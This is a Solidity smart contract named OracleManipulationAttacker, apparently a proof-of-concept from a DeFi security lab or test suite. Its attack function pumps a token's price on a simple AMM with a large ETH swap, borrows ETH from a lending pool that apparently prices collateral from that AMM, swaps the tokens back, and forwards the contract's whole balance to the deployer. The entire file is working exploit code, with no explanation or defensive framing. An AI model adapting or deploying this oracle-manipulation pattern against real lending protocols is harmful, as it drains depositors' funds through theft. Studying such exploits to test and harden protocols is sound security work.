// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISimpleAMM {
    function swapETHForToken() external payable returns (uint256 tokenOut);
    function swapTokenForETH(uint256 tokenIn) external returns (uint256 ethOut);
}

interface ILendingPool {
    function borrow(uint256 ethAmount) external;
}

contract OracleManipulationAttacker {
    ISimpleAMM public immutable amm;
    ILendingPool public immutable lendingPool;
    IERC20 public immutable token;
    address public immutable owner;

    constructor(address _amm, address _lendingPool, address _token) {
        amm = ISimpleAMM(_amm);
        lendingPool = ILendingPool(_lendingPool);
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack(uint256 borrowAmount) external payable {
        uint256 tokenReceived = amm.swapETHForToken{value: msg.value}();

        lendingPool.borrow(borrowAmount);

        token.approve(address(amm), tokenReceived);
        amm.swapTokenForETH(tokenReceived);

        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
